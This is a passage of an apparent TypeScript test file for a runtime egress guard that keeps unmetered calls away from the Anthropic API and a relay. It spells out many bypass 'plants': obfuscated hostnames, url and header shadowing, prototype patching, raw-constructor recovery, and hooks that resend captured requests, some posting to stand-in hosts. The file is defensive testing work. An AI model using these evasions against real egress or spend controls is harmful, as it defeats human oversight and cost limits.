// The runtime egress guard, in real processes: each child stubs the network with a recording
// fetch (and fake XMLHttpRequest, WebSocket, EventSource and sendBeacon), installs the guard
// the way an entry point does, then runs the review's plants. A plant that reaches the stub
// is an unmetered send. MessagesClient's own call must still reach it, exactly once.
import { spawnSync } from 'node:child_process';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { pathToFileURL } from 'node:url';
import { describe, expect, it } from 'vitest';
import { APP_CSP } from '../../apps/web/csp.ts';
import { RELAY_ORIGIN } from '../../apps/web/src/surface/relay.ts';
import { fakeKey, repoRoot, tempDir, write } from './helpers.ts';

const HOST = ['api', 'anthropic', 'com'].join('.');
const repo = (rel: string) => pathToFileURL(join(repoRoot, rel)).href;
const POST = `{ method: 'POST', headers: { 'x-api-key': 'sk-fake', 'content-type': 'application/json' }, body: '{}' }`;
const client = `import { MessagesClient } from '${repo('packages/core/anthropic.ts')}';\nimport { openNodeLedger } from '${repo('cli/adapters/ledger-node.ts')}';\n`;

// The review's 13 lint-clean shapes (pr-review-P2-7 defect 1, plants a to m) that resolve to the
// API host, as runtime code. Lint and file-type evasions (j to m) reduce to a literal-host fetch.
const PLANTS: Record<string, string> = {
  'a-template-expr': `const sub = 'api'; export const go = () => fetch(\`https://\${sub}.anthropic.com/v1/messages\`, ${POST});`,
  'b-array-join': `export const go = () => fetch(['https://api', 'anthropic', 'com/v1/messages'].join('.'), ${POST});`,
  'c-percent-host': `export const go = () => fetch('https://api%2Eanthropic%2Ecom/v1/messages', ${POST});`,
  'd-fullwidth-dot': `export const go = () => fetch('https://api\u3002anthropic\u3002com/v1/messages', ${POST});`,
  'e-fromcharcode': `const h = String.fromCharCode(${[...HOST].map((c) => c.charCodeAt(0)).join(', ')}); export const go = () => fetch('https://' + h + '/v1/messages', ${POST});`,
  'f-concat-var-middle': `const mid = 'anthropic.'; export const go = () => fetch('https://api.' + mid + 'com/v1/messages', ${POST});`,
  'g-read-client-source': `import { readFileSync } from 'node:fs';
export const go = () => { const src = readFileSync(new URL('${repo('packages/core/anthropic.ts')}'), 'utf8'); return fetch(/'(https:\\/\\/[^']+\\/v1\\/messages)'/.exec(src)[1], ${POST}); };`,
  'i-json-import': `import cfg from './host.json' with { type: 'json' }; export const go = () => fetch(cfg.url, ${POST});`,
  'j-eslint-disable-line': `export const go = () => fetch('https://${HOST}/v1/messages', ${POST});`,
  'k-url-object': `export const go = () => fetch(new URL('/v1/messages', 'https://${HOST.toUpperCase()}.'), ${POST});`,
  'l-to-string-swap': `let n = 0; const u = { toString: () => (n++ === 0 ? 'https://example.org/' : 'https://${HOST}/v1/messages') }; export const go = () => fetch(u, ${POST});`,
  'm-foreign-request': `export const go = () => fetch(new Request('https://${HOST}/v1/messages', ${POST}));`,
  'x-xhr': `export const go = () => { const x = new XMLHttpRequest(); x.open('POST', 'https://api%2Eanthropic.com/v1/messages'); x.send('{}'); };`,
  'x-websocket': `export const go = () => new WebSocket('wss://${HOST}/v1/messages');`,
  'x-eventsource': `export const go = () => new EventSource('https://${HOST}/v1/messages');`,
  'x-beacon': `export const go = () => navigator.sendBeacon('https://${HOST}/v1/messages', '{}');`,
  'x-fetch-later': `export const go = () => fetchLater('https://${HOST}/v1/messages', ${POST});`,
  'x-webtransport': `export const go = () => new WebTransport('https://${HOST}/v1/messages');`,
  'x-websocketstream': `export const go = () => new WebSocketStream('wss://${HOST}/v1/messages');`,
  // The two hook plants (defect 2): the client's injected transport keeps what it was handed.
  'n-hook-replay': `${client}
export async function go(apiKey) {
  const { ledger } = openNodeLedger({ transport: 'live' });
  const grant = await ledger.batchStart(0.1);
  let captured;
  const c = new MessagesClient({ grant, ledger, apiKey, maxAttempts: 1, fetch: async (req) => { captured = req; return new Response('{}', { status: 401 }); } });
  await c.send([{ role: 'user', content: 'hi' }], { max_tokens: 1 }).catch(() => undefined);
  await grant.close();
  const errors = [];
  const tryFetch = async (...a) => { try { await fetch(...a); } catch (e) { errors.push(e.message); } };
  for (let i = 0; i < 3; i++) await tryFetch(captured.url, { method: 'POST', headers: captured.headers, body: '{"max_tokens":64000}' });
  await tryFetch(captured);
  if (errors.length < 4) return 'sent';
  throw new TypeError(errors.join(' | '));
}`,
  'o-hook-multisend': `${client}
export async function go(apiKey) {
  const { ledger } = openNodeLedger({ transport: 'live' });
  const grant = await ledger.batchStart(0.1);
  const errors = [];
  let first;
  const c = new MessagesClient({ grant, ledger, apiKey, maxAttempts: 1, fetch: async (req) => {
    for (const send of [() => fetch(req), () => fetch(req), () => fetch(req.clone()), () => fetch(new Request(req)), () => fetch(req, { body: '{"max_tokens":64000}' })]) {
      try { const r = await send(); first ??= r; } catch (e) { errors.push(e.message); }
    }
    return first;
  } });
  await c.send([{ role: 'user', content: 'hi' }], { max_tokens: 1 });
  await grant.close();
  throw new TypeError(errors.join(' | '));
}`,
  'p-hook-mutate': `${client}
export async function go(apiKey) {
  const { ledger } = openNodeLedger({ transport: 'live' });
  const grant = await ledger.batchStart(0.1);
  const c = new MessagesClient({ grant, ledger, apiKey, maxAttempts: 1, fetch: async (req) => { req.headers.set('anthropic-beta', 'server-tools'); return fetch(req); } });
  await c.send([{ role: 'user', content: 'hi' }], { max_tokens: 1 });
  await grant.close();
}`,
  // pr-review-P2-9 defect 1: the guard must read a Request's url and headers from its internal
  // slots, not from properties the caller can shadow.
  'q-url-shadow': `export const go = () => { const r = new Request('https://${HOST}/v1/messages', ${POST}); Object.defineProperty(r, 'url', { value: 'https://example.test/' }); return fetch(r); };`,
  'r-request-subclass': `class R extends Request { get url() { return 'https://example.test/'; } }
export const go = () => fetch(new R('https://${HOST}/v1/messages', ${POST}));`,
  's-prototype-url-patch': `export async function go() {
  const d = Object.getOwnPropertyDescriptor(Request.prototype, 'url');
  Object.defineProperty(Request.prototype, 'url', { configurable: true, get: () => 'https://example.test/' });
  try { return await fetch(new Request('https://${HOST}/v1/messages', ${POST})); } finally { Object.defineProperty(Request.prototype, 'url', d); }
}`,
  't-transport-header-swap': `${client}
export async function go(apiKey) {
  const { ledger } = openNodeLedger({ transport: 'live' });
  const grant = await ledger.batchStart(0.1);
  const c = new MessagesClient({ grant, ledger, apiKey, maxAttempts: 1, fetch: async (req) => {
    const shown = new Headers(req.headers);
    req.headers.set('anthropic-beta', 'context-1m-2025-08-07');
    Object.defineProperty(req, 'headers', { value: shown });
    return fetch(req);
  } });
  try { await c.send([{ role: 'user', content: 'hi' }], { max_tokens: 1 }); } finally { await grant.close(); }
}`,
  'u-transport-copies': `${client}
export async function go(apiKey) {
  const { ledger } = openNodeLedger({ transport: 'live' });
  const grant = await ledger.batchStart(0.1);
  const errors = [];
  const c = new MessagesClient({ grant, ledger, apiKey, maxAttempts: 1, fetch: async (req) => {
    const copies = [1, 2, 3].map(() => { const r = new Request(req, { body: '{"max_tokens":64000}' }); Object.defineProperty(r, 'url', { value: 'https://example.test/' }); return r; });
    const res = await fetch(req);
    for (const r of copies) { try { await fetch(r); } catch (e) { errors.push(e.message); } }
    return res;
  } });
  await c.send([{ role: 'user', content: 'hi' }], { max_tokens: 1 });
  await grant.close();
  throw new TypeError(errors.join(' | '));
}`,
  // pr-review-P2-9 defect 2: a dispatcher in init would pick the host below the guard.
  'v-dispatcher-init': `const dispatcher = { dispatch: () => { throw new Error('dispatcher used'); } };
export async function go() {
  await fetch('https://example.test/v1/messages', { ...${POST}, dispatcher });
  await fetch(new Request('https://example.test/v1/messages', ${POST}), { dispatcher });
  await fetch('https://example.test/v1/messages', Object.create({ dispatcher }));
}`,
};

const RUNNER = `
const sends = [];
// What the platform would send: a Request's internal slots, never a property a plant shadowed.
// Reading Request loads undici, which sets the global dispatcher.
const nativeUrl = Object.getOwnPropertyDescriptor(Request.prototype, 'url').get;
// A dispatcher other than the global one (the Agent at install, or the guarded one that replaces
// it in the slot) would pick the connection below the guard.
const agent = globalThis[Symbol.for('undici.globalDispatcher.2')];
const foreign = (init) => init?.dispatcher !== undefined && init.dispatcher !== agent && init.dispatcher !== globalThis[Symbol.for('undici.globalDispatcher.2')];
const record = (api, url, init) => sends.push({ api, host: new URL(String(url)).hostname, ...(foreign(init) ? { dispatcher: true } : {}), ...(init?.redirect !== undefined ? { redirect: init.redirect } : {}) });
const sse = (events) => events.map((e) => 'event: ' + e.type + '\\ndata: ' + JSON.stringify(e) + '\\n\\n').join('');
const OK = sse([
  { type: 'message_start', message: { id: 'm', model: 'claude-opus-5-5', role: 'assistant', content: [], stop_reason: null, usage: { input_tokens: 10, output_tokens: 1 } } },
  { type: 'message_delta', delta: { stop_reason: 'end_turn' }, usage: { output_tokens: 1 } },
  { type: 'message_stop' },
]);
globalThis.fetch = async (input, init) => { const r = input instanceof Request ? input : new Request(input, init); record('fetch', nativeUrl.call(r), init); return new Response(OK, { status: 200 }); };
globalThis.XMLHttpRequest = class { open(_m, u) { this.u = u; } send() { record('xhr', this.u); } };
// The stubs extend EventTarget, as the platform's constructors do; the raw ones stay readable to
// the plants as RAW, which the page never has.
globalThis.WebSocket = class extends EventTarget { static OPEN = 1; constructor(u) { super(); record('websocket', u); } };
globalThis.EventSource = class extends EventTarget { static OPEN = 1; constructor(u) { super(); record('eventsource', u); } };
globalThis.WebTransport = class { constructor(u) { record('webtransport', u); } };
globalThis.WebSocketStream = class { constructor(u) { record('websocketstream', u); } };
globalThis.RAW = { EventSource: globalThis.EventSource, WebSocket: globalThis.WebSocket };
globalThis.fetchLater = (input, init) => { record('fetchlater', input instanceof Request ? nativeUrl.call(input) : input, init); return { activated: false }; };
Object.defineProperty(globalThis.navigator, 'sendBeacon', { configurable: true, writable: true, value: (u) => { record('beacon', u); return true; } });
// PROTO=1: the stubs live where a browser Worker keeps them, on a prototype of the scope (fetch on
// WorkerGlobalScope.prototype, sendBeacon on Navigator.prototype), with no own property left.
if (process.env.PROTO === '1') {
  const scopeProto = Object.create(Object.getPrototypeOf(globalThis));
  Object.defineProperty(scopeProto, 'fetch', { configurable: true, writable: true, value: globalThis.fetch });
  delete globalThis.fetch;
  Object.setPrototypeOf(globalThis, scopeProto);
  Object.defineProperty(Object.getPrototypeOf(globalThis.navigator), 'sendBeacon', { configurable: true, writable: true, value: globalThis.navigator.sendBeacon });
  delete globalThis.navigator.sendBeacon;
  if (Object.hasOwn(globalThis, 'fetch') || Object.hasOwn(globalThis.navigator, 'sendBeacon')) throw new Error('PROTO: an own property is left');
}
let guard = 'missing';
try {
  const { installEgressGuard } = await import(process.env.EGRESS_MODULE);
  const opts = {
    ...(process.env.ALLOWED ? { allowedOrigins: process.env.ALLOWED.split(',') } : {}),
    ...(process.env.METERED ? { meteredOrigins: process.env.METERED.split(',') } : {}),
  };
  installEgressGuard(globalThis, Object.keys(opts).length > 0 ? opts : undefined);
  guard = 'installed';
} catch (e) { guard = 'missing: ' + e.message.split('\\n')[0]; }
const out = { guard, plants: {} };
for (const name of process.env.PLANTS.split(',')) {
  const before = sends.length;
  let error = null;
  try { await (await import('./' + name + '.mjs')).go(process.env.KEY); } catch (e) { error = e.message; }
  out.plants[name] = { sends: sends.slice(before), error };
}
if (process.env.CLIENT === '1') {
  const { MessagesClient } = await import(process.env.CLIENT_MODULE);
  const { openNodeLedger } = await import(process.env.LEDGER_MODULE);
  const { ledger } = openNodeLedger({ transport: 'live' });
  const grant = await ledger.batchStart(0.1);
  const before = sends.length;
  const r = await new MessagesClient({ grant, ledger, apiKey: process.env.KEY, maxAttempts: 1, ...(process.env.ENDPOINT ? { endpoint: process.env.ENDPOINT } : {}) }).send([{ role: 'user', content: 'hi' }], { max_tokens: 1 });
  await grant.close();
  out.client = { status: r.status, sends: sends.slice(before) };
}
process.stdout.write(JSON.stringify(out));
`;

// A context limited to its own origin (the trial Worker, verifier review-P15-1 F1): sends to any
// other origin are refused by every API the guard wraps; its own origin still answers, by fetch
// only and with redirect: 'error', so a redirect cannot take it elsewhere (verifier-phase-P15-2
// F1). XHR and EventSource follow redirects with no way to opt out, so they are refused outright.
const SELF = 'https://app.test';
const ORIGIN_PLANTS: Record<string, string> = {
  'w-self-fetch': `export const go = () => fetch('${SELF}/clinical-agent-env/data/fixtures/manifest.json');`,
  'w-self-request': `export const go = () => fetch(new Request('${SELF}/assets/x.json'));`,
  'w-self-redirect-follow': `export const go = () => fetch('${SELF}/r', { redirect: 'follow' });`,
  'w-self-request-follow': `export const go = () => fetch(new Request('${SELF}/r', { redirect: 'follow' }));`,
  'w-self-xhr': `export const go = () => { const x = new XMLHttpRequest(); x.open('GET', '${SELF}/assets/x.json'); x.send(); };`,
  'w-self-eventsource': `export const go = () => new EventSource('${SELF}/events');`,
  'w-foreign-fetch': `export const go = () => fetch('https://example.org/collect', ${POST});`,
  'w-foreign-request': `export const go = () => fetch(new Request('https://example.org/collect', ${POST}));`,
  'w-foreign-port': `export const go = () => fetch('https://app.test:8443/collect');`,
  'w-foreign-scheme': `export const go = () => fetch('http://app.test/collect');`,
  'w-foreign-xhr': `export const go = () => { const x = new XMLHttpRequest(); x.open('POST', 'https://example.org/collect'); x.send('{}'); };`,
  'w-foreign-websocket': `export const go = () => new WebSocket('wss://example.org/collect');`,
  'w-foreign-eventsource': `export const go = () => new EventSource('https://example.org/collect');`,
  'w-foreign-beacon': `export const go = () => navigator.sendBeacon('https://example.org/collect', '{}');`,
  'w-foreign-fetch-later': `export const go = () => fetchLater('https://example.org/collect', ${POST});`,
  'w-api-unclaimed': `export const go = () => fetch('https://${HOST}/v1/messages', ${POST});`,
};
Object.assign(PLANTS, ORIGIN_PLANTS);

// A relay that forwards to the API (P16g): with meteredOrigins it is guarded like the API host,
// so only MessagesClient's own Request at its endpoint reaches it, once. Each spelling below
// resolves to the relay's origin.
const RELAY = 'https://relay.test';
const RELAY_URL = `${RELAY}/v1/messages`;
const RELAY_PLANTS: Record<string, string> = {
  'y-relay-string': `export const go = () => fetch('${RELAY_URL}', ${POST});`,
  'y-relay-url-object': `export const go = () => fetch(new URL('/v1/messages', '${RELAY}'), ${POST});`,
  'y-relay-request': `export const go = () => fetch(new Request('${RELAY_URL}', ${POST}));`,
  'y-relay-upper-case': `export const go = () => fetch('https://RELAY.TEST/v1/messages', ${POST});`,
  'y-relay-trailing-dot': `export const go = () => fetch('https://relay.test./v1/messages', ${POST});`,
  'y-relay-percent-dot': `export const go = () => fetch('https://relay%2Etest/v1/messages', ${POST});`,
  'y-relay-default-port': `export const go = () => fetch('https://relay.test:443/v1/messages', ${POST});`,
  'y-relay-xhr': `export const go = () => { const x = new XMLHttpRequest(); x.open('POST', '${RELAY_URL}'); x.send('{}'); };`,
  'y-relay-websocket': `export const go = () => new WebSocket('wss://relay.test/v1/messages');`,
  'y-relay-eventsource': `export const go = () => new EventSource('${RELAY_URL}');`,
  'y-relay-beacon': `export const go = () => navigator.sendBeacon('${RELAY_URL}', '{}');`,
  'y-relay-fetch-later': `export const go = () => fetchLater('${RELAY_URL}', ${POST});`,
  'y-relay-webtransport': `export const go = () => new WebTransport('${RELAY_URL}');`,
  'y-relay-websocketstream': `export const go = () => new WebSocketStream('wss://relay.test/v1/messages');`,
  // verifier-phase-P17i-P16h-web2r2-1 S2: the raw constructor behind a guarded one, by the
  // guarded constructor's own prototype and by its prototype object's constructor.
  'y-relay-es-proto': `export const go = () => new (Object.getPrototypeOf(EventSource))('${RELAY_URL}');`,
  'y-relay-es-prototype-constructor': `export const go = () => new EventSource.prototype.constructor('${RELAY_URL}');`,
  'y-relay-ws-proto': `export const go = () => new (Object.getPrototypeOf(WebSocket))('wss://relay.test/v1/messages');`,
  'y-relay-ws-prototype-constructor': `export const go = () => new WebSocket.prototype.constructor('wss://relay.test/v1/messages');`,
  'y-relay-wt-proto': `export const go = () => new (Object.getPrototypeOf(WebTransport))('${RELAY_URL}');`,
  'y-relay-wt-prototype-constructor': `export const go = () => new WebTransport.prototype.constructor('${RELAY_URL}');`,
  'y-relay-es-prototype-proto-constructor': `export const go = () => new (Object.getPrototypeOf(EventSource.prototype).constructor)('${RELAY_URL}');`,
  'y-ctor-shape': `export function go() {
  const es = new EventSource('https://app.test/events');
  throw new TypeError(JSON.stringify({ esProto: Object.getPrototypeOf(EventSource) === EventTarget && EventSource !== RAW.EventSource, wsProto: Object.getPrototypeOf(WebSocket) === EventTarget && WebSocket !== RAW.WebSocket, eventTarget: es instanceof EventTarget, esCtor: EventSource.prototype.constructor === EventSource, wsCtor: WebSocket.prototype.constructor === WebSocket, wtCtor: WebTransport.prototype.constructor === WebTransport, instance: es instanceof EventSource, statics: [EventSource.OPEN, WebSocket.OPEN], names: [EventSource.name, WebSocket.name, WebTransport.name], call: (() => { try { EventSource('https://app.test/x'); return 'called'; } catch (e) { return e.name; } })() }));
}`,
  'y-relay-es-constructor-restore': `const raw = Object.getPrototypeOf(EventSource);
export const go = () => { try { EventSource.prototype.constructor = raw; } catch {} return new EventSource.prototype.constructor('${RELAY_URL}'); };`,
  'y-relay-fetch-later-request': `export const go = () => fetchLater(new Request('${RELAY_URL}', ${POST}));`,
  'y-relay-refusal-name': `export async function go() { try { await fetch('${RELAY_URL}', ${POST}); } catch (e) { throw new TypeError(e.name + ': ' + e.message); } }`,
  'y-relay-hook-resend': `${client}
export async function go(apiKey) {
  const { ledger } = openNodeLedger({ transport: 'live' });
  const grant = await ledger.batchStart(0.1);
  const errors = [];
  let first;
  const c = new MessagesClient({ grant, ledger, apiKey, maxAttempts: 1, endpoint: '${RELAY_URL}', fetch: async (req) => {
    for (const send of [() => fetch(req), () => fetch(req), () => fetch(req.clone()), () => fetch(new Request(req))]) {
      try { const r = await send(); first ??= r; } catch (e) { errors.push(e.message); }
    }
    return first;
  } });
  await c.send([{ role: 'user', content: 'hi' }], { max_tokens: 1 });
  await grant.close();
  throw new TypeError(errors.join(' | '));
}`,
};
Object.assign(PLANTS, RELAY_PLANTS);

// The app's own relay (P16h PR-web-2): APP_CSP's connect-src names the relay, not the API host.
// Plant h reads that origin from APP_CSP and fetches it; the second plant fetches RELAY_URL as
// relay.ts exports it. The guard is installed as the app installs it, the relay metered.
const APP_RELAY_PLANTS: Record<string, string> = {
  'h-read-csp': `import { APP_CSP } from '${repo('apps/web/csp.ts')}';
export const go = () => fetch(/connect-src \\S+ (https:\\/\\/[^;" ]+)/.exec(APP_CSP)[1] + '/v1/messages', ${POST});`,
  'h-relay-url': `import { RELAY_URL } from '${repo('apps/web/src/surface/relay.ts')}';
export async function go() { try { await fetch(RELAY_URL, ${POST}); } catch (e) { throw new TypeError(e.name + ': ' + e.message); } }`,
};
Object.assign(PLANTS, APP_RELAY_PLANTS);

// The security review's S1 (review-security-P16h-web-1): fetch and sendBeacon called through the
// prototype that holds the raw function, as a browser Worker and page expose them. The last two
// first try to put a raw function back, which the lock refuses; they run last, so a replacement
// that got through cannot reach the other plants.
const PROTO_OWNER = `const owner = (o, k) => { for (let p = Object.getPrototypeOf(o); p !== null; p = Object.getPrototypeOf(p)) if (Object.hasOwn(p, k)) return p; throw new Error('no prototype holds ' + k); };
const restore = (o, k, v) => { try { owner(o, k)[k] = v; } catch {} };`;
const PROTO_PLANTS: Record<string, string> = {
  'p-proto-fetch-relay': `${PROTO_OWNER}\nexport const go = () => owner(globalThis, 'fetch').fetch.call(globalThis, '${RELAY_URL}', ${POST});`,
  'p-proto-fetch-api': `${PROTO_OWNER}\nexport const go = () => owner(globalThis, 'fetch').fetch.call(globalThis, 'https://${HOST}/v1/messages', ${POST});`,
  'p-proto-beacon-relay': `${PROTO_OWNER}\nexport const go = () => owner(navigator, 'sendBeacon').sendBeacon.call(navigator, '${RELAY_URL}', '{}');`,
  'p-proto-beacon-api': `${PROTO_OWNER}\nexport const go = () => owner(navigator, 'sendBeacon').sendBeacon.call(navigator, 'https://${HOST}/v1/messages', '{}');`,
  'p-proto-foreign-fetch': `${PROTO_OWNER}\nexport const go = () => owner(globalThis, 'fetch').fetch.call(globalThis, 'https://example.org/collect', ${POST});`,
  'p-proto-self-fetch': `${PROTO_OWNER}\nexport const go = () => owner(globalThis, 'fetch').fetch.call(globalThis, '${SELF}/assets/x.json');`,
  'p-proto-fetch-restore': `${PROTO_OWNER}\nexport const go = () => { restore(globalThis, 'fetch', () => 'raw'); return owner(globalThis, 'fetch').fetch.call(globalThis, '${RELAY_URL}', ${POST}); };`,
  'p-proto-beacon-restore': `${PROTO_OWNER}\nexport const go = () => { restore(navigator, 'sendBeacon', () => true); return owner(navigator, 'sendBeacon').sendBeacon.call(navigator, '${RELAY_URL}', '{}'); };`,
};
Object.assign(PLANTS, PROTO_PLANTS);

function run(names: string[], opts: { client?: boolean; allowed?: string[]; metered?: string[]; endpoint?: string; proto?: boolean } = {}) {
  const dir = tempDir('egress');
  write(dir, 'package.json', '{"type":"module"}');
  write(dir, 'host.json', JSON.stringify({ url: `https://${HOST}/v1/messages` }));
  write(dir, 'runner.mjs', RUNNER);
  for (const n of names) write(dir, `${n}.mjs`, PLANTS[n] ?? '');
  const home = tempDir('egress-home');
  const env: Record<string, string> = {
    PATH: process.env.PATH ?? '', HOME: home, SPEND_LEDGER: join(home, 'spend.jsonl'), KEY: fakeKey('E'), PLANTS: names.join(','),
    EGRESS_MODULE: repo('packages/core/egress.ts'), CLIENT_MODULE: repo('packages/core/anthropic.ts'), LEDGER_MODULE: repo('cli/adapters/ledger-node.ts'),
    CLIENT: opts.client ? '1' : '0',
    ...(opts.allowed ? { ALLOWED: opts.allowed.join(',') } : {}),
    ...(opts.metered ? { METERED: opts.metered.join(',') } : {}),
    ...(opts.endpoint ? { ENDPOINT: opts.endpoint } : {}),
    ...(opts.proto ? { PROTO: '1' } : {}),
  };
  const r = spawnSync(process.execPath, ['runner.mjs'], { cwd: dir, env, encoding: 'utf8' });
  if (r.status !== 0) throw new Error(`runner exited ${r.status}: ${r.stderr}`);
  return JSON.parse(r.stdout) as {
    guard: string;
    plants: Record<string, { sends: Array<{ api: string; host: string }>; error: string | null }>;
    client?: { status: number; sends: Array<{ api: string; host: string }> };
  };
}

describe('the egress guard refuses every send to the API host that MessagesClient did not make', () => {
  const names = Object.keys(PLANTS).filter((n) => !(n in ORIGIN_PLANTS) && !(n in RELAY_PLANTS) && !(n in APP_RELAY_PLANTS) && !(n in PROTO_PLANTS));
  const out = run(names, { client: true });

  it('installs', () => {
    expect(out.guard).toBe('installed');
  });

  it('l-to-string-swap: the URL is resolved once, so the request goes where the guard checked, never to the API host', () => {
    expect(out.plants['l-to-string-swap']).toEqual({ sends: [{ api: 'fetch', host: 'example.org' }], error: null });
  });

  const MIXED = ['o-hook-multisend', 'l-to-string-swap', 'u-transport-copies', 'v-dispatcher-init'];
  it.each(names.filter((n) => !MIXED.includes(n)))('%s: refused, 0 sends', (name) => {
    const p = out.plants[name];
    expect(p?.sends).toEqual([]);
    expect(p?.error).toMatch(/egress guard/);
  });

  it('o-hook-multisend: the client request goes out once; the second fetch, a clone, a copy and an init override are refused', () => {
    const p = out.plants['o-hook-multisend'];
    expect(p?.sends).toEqual([{ api: 'fetch', host: HOST }]);
    expect(p?.error?.split(' | ')).toHaveLength(4);
    for (const e of p?.error?.split(' | ') ?? []) expect(e).toMatch(/egress guard/);
  });

  it('u-transport-copies: the registered Request goes out once; 3 copies with a shadowed url are refused', () => {
    const p = out.plants['u-transport-copies'];
    expect(p?.sends).toEqual([{ api: 'fetch', host: HOST }]);
    expect(p?.error?.split(' | ')).toHaveLength(3);
    for (const e of p?.error?.split(' | ') ?? []) expect(e).toMatch(/egress guard/);
  });

  it('v-dispatcher-init: a dispatcher key in init, own or inherited, is dropped, so the checked host is the one contacted', () => {
    const sent = { api: 'fetch', host: 'example.test' };
    expect(out.plants['v-dispatcher-init']).toEqual({ sends: [sent, sent, sent], error: null });
  });

  it('a MessagesClient call through the guarded global fetch still passes, once', () => {
    expect(out.client).toEqual({ status: 200, sends: [{ api: 'fetch', host: HOST }] });
  });
});

describe('with allowedOrigins, the guard refuses every send to another origin', () => {
  const names = Object.keys(ORIGIN_PLANTS);
  const out = run(names, { client: true, allowed: [`${SELF}/`] });

  it('installs', () => {
    expect(out.guard).toBe('installed');
  });

  it.each(['w-self-fetch', 'w-self-request', 'w-self-redirect-follow', 'w-self-request-follow'])('%s: its own origin answers, with redirects refused', (name) => {
    expect(out.plants[name]).toEqual({ sends: [{ api: 'fetch', host: 'app.test', redirect: 'error' }], error: null });
  });

  it.each(names.filter((n) => n.startsWith('w-foreign') || n === 'w-api-unclaimed' || n === 'w-self-xhr' || n === 'w-self-eventsource'))('%s: refused, 0 sends', (name) => {
    const p = out.plants[name];
    expect(p?.sends).toEqual([]);
    expect(p?.error).toMatch(/egress guard/);
  });

  it('a foreign send names the origin it refused and the origins allowed', () => {
    expect(out.plants['w-foreign-fetch']?.error).toContain('https://example.org');
    expect(out.plants['w-foreign-fetch']?.error).toContain(SELF);
  });

  it('XHR and EventSource are refused whatever the origin, since they follow redirects', () => {
    expect(out.plants['w-self-xhr']?.error).toContain('XMLHttpRequest');
    expect(out.plants['w-self-eventsource']?.error).toContain('EventSource');
  });

  it('MessagesClient\'s own call to the API still passes, once', () => {
    expect(out.client).toEqual({ status: 200, sends: [{ api: 'fetch', host: HOST }] });
  });

  it('without the option, the same foreign sends go out', () => {
    const open = run(['w-foreign-fetch', 'w-foreign-xhr']);
    expect(open.plants['w-foreign-fetch']).toEqual({ sends: [{ api: 'fetch', host: 'example.org' }], error: null });
    expect(open.plants['w-foreign-xhr']).toEqual({ sends: [{ api: 'xhr', host: 'example.org' }], error: null });
  });
});

describe('with meteredOrigins, a relay origin is guarded like the API host', () => {
  const names = Object.keys(RELAY_PLANTS);
  const out = run(names, { client: true, metered: [RELAY], endpoint: RELAY_URL });

  it('installs', () => {
    expect(out.guard).toBe('installed');
  });

  // Each guarded constructor's own prototype is the raw one's parent (EventTarget, or
  // Function.prototype for a base class), never the raw constructor: `new` on it builds an object
  // that sends nothing, or throws.
  const PROTO_CTORS = names.filter((n) => /^y-relay-(es|ws|wt)-proto$/.test(n));
  // The raw class sat one step up from the guarded constructor's prototype object; now that object
  // is the raw prototype itself, so one step up is its parent's (EventTarget, or Object here).
  it('y-relay-es-prototype-proto-constructor: one step up is not the raw EventSource, 0 sends', () => {
    expect(out.plants['y-relay-es-prototype-proto-constructor']?.sends).toEqual([]);
  });
  it.each(PROTO_CTORS)('%s: the prototype is not the raw constructor, 0 sends', (name) => {
    const p = out.plants[name];
    expect(p?.sends).toEqual([]);
    expect(p?.error ?? 'built').toMatch(/^built$|is not a constructor/);
  });

  it('y-ctor-shape: a guarded constructor hides the raw one and keeps its statics, name and instanceof, and needs new', () => {
    expect(JSON.parse(out.plants['y-ctor-shape']?.error ?? '{}')).toEqual({ esProto: true, wsProto: true, eventTarget: true, esCtor: true, wsCtor: true, wtCtor: true, instance: true, statics: [1, 1], names: ['EventSource', 'WebSocket', 'WebTransport'], call: 'TypeError' });
    expect(out.plants['y-ctor-shape']?.sends).toEqual([{ api: 'eventsource', host: 'app.test' }]);
  });

  it.each(names.filter((n) => n !== 'y-relay-hook-resend' && n !== 'y-ctor-shape' && n !== 'y-relay-es-prototype-proto-constructor' && !PROTO_CTORS.includes(n)))('%s: refused with EgressRefusal, 0 sends', (name) => {
    const p = out.plants[name];
    expect(p?.sends).toEqual([]);
    expect(p?.error).toMatch(/egress guard/);
  });

  it('y-relay-refusal-name: the refusal is an EgressRefusal that names the relay origin', () => {
    expect(out.plants['y-relay-refusal-name']?.error).toMatch(new RegExp(`^EgressRefusal: egress guard: fetch to ${RELAY} refused`));
  });

  it('y-relay-hook-resend: the client Request goes to the relay once; a resend, a clone and a copy are refused', () => {
    const p = out.plants['y-relay-hook-resend'];
    expect(p?.sends).toEqual([{ api: 'fetch', host: 'relay.test' }]);
    expect(p?.error?.split(' | ')).toHaveLength(3);
    for (const e of p?.error?.split(' | ') ?? []) expect(e).toMatch(/egress guard/);
  });

  it('MessagesClient\'s own call to the relay passes, once', () => {
    expect(out.client).toEqual({ status: 200, sends: [{ api: 'fetch', host: 'relay.test' }] });
  });

  it('the API host is still guarded beside it', () => {
    const r = run(['j-eslint-disable-line', 'c-percent-host'], { metered: [RELAY] });
    for (const p of Object.values(r.plants)) expect(p).toMatchObject({ sends: [], error: expect.stringMatching(/egress guard/) });
  });

  it('another origin of the same host (scheme or port) is not the relay and goes out', () => {
    const r = run(['w-foreign-port'], { metered: ['https://app.test:9443'] });
    expect(r.plants['w-foreign-port']).toEqual({ sends: [{ api: 'fetch', host: 'app.test' }], error: null });
  });

  it('with allowedOrigins too (the trial Worker), only the client Request reaches the relay, listed or not', () => {
    for (const allowed of [[SELF], [SELF, RELAY]]) {
      const r = run(['y-relay-string', 'y-relay-request', 'w-self-fetch'], { client: true, allowed, metered: [RELAY], endpoint: RELAY_URL });
      expect(r.plants['y-relay-string']).toMatchObject({ sends: [], error: expect.stringMatching(/egress guard/) });
      expect(r.plants['y-relay-request']).toMatchObject({ sends: [], error: expect.stringMatching(/egress guard/) });
      expect(r.plants['w-self-fetch']).toEqual({ sends: [{ api: 'fetch', host: 'app.test', redirect: 'error' }], error: null });
      expect(r.client).toEqual({ status: 200, sends: [{ api: 'fetch', host: 'relay.test' }] });
    }
  });

  it('without the option, a fetch to the relay is not refused', () => {
    const open = run(['y-relay-string', 'y-relay-xhr']);
    expect(open.plants['y-relay-string']).toEqual({ sends: [{ api: 'fetch', host: 'relay.test' }], error: null });
    expect(open.plants['y-relay-xhr']).toEqual({ sends: [{ api: 'xhr', host: 'relay.test' }], error: null });
  });
});

describe('the app relay (APP_CSP, RELAY_URL) is guarded as the app installs the guard', () => {
  const names = Object.keys(APP_RELAY_PLANTS);
  const out = run(names, { allowed: [SELF, RELAY_ORIGIN], metered: [RELAY_ORIGIN] });

